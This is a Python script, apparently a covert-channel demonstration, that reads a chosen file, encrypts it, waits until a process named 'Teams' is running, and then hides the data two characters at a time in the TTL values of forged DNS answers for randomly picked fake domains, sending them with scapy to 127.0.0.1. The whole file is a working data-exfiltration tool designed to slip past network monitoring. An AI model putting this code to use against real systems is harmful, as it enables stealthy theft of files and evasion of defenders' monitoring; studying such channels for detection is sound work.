import json
import optparse
import psutil

from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

from crypt import Crypt

parser = optparse.OptionParser("usage: %prog -F <file> -")
parser.add_option('-F', '--file', dest='file', type='string', help='specify the file to send')

(options, args) = parser.parse_args()

if not options.file:
    parser.error('A file to send must be specified')

file = options.file

with open(file) as to_send:
    message = to_send.readlines()

message = ''.join(message)

f = open('dns.json')
data = json.load(f)
f.close()

message = Crypt.encrypt(message)

if len(message) % 2:
    message += '//'
else:
    message += '///'

print(message)

start = False

while not start:
    for proc in psutil.process_iter():
        try:
            processName = proc.name()
            processID = proc.pid
            if "Teams" in processName:
                print(processName, ' ::: ', processID)
                start = True
            else:
                print("Teams non in esecuzione")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

for i in range(0, len(message), 2):
    temp = message[i:i + 2]

    number_random = random.randint(0, len(data) - 1)
    fake_domain = data[number_random]["dominio"]
    ip = data[number_random]["ip"]
    try:
        ttl = (ord(temp[0]) * 256 + ord(temp[1])) * 2
    except:
        ttl = (ord(temp[0]) * 256 + ord('/')) * 2

    answer = sr1(
        IP(dst="127.0.0.1") / UDP(sport=RandShort(), dport=53) / DNS(id=12456, rd=1, qd=DNSQR(qname=fake_domain),
                                                                     an=DNSRR(ttl=ttl, rrname=fake_domain,
                                                                              rdata=ip)), verbose=0)

    print(repr(answer[DNS]))

    # time.sleep(random.randint(2, 10))
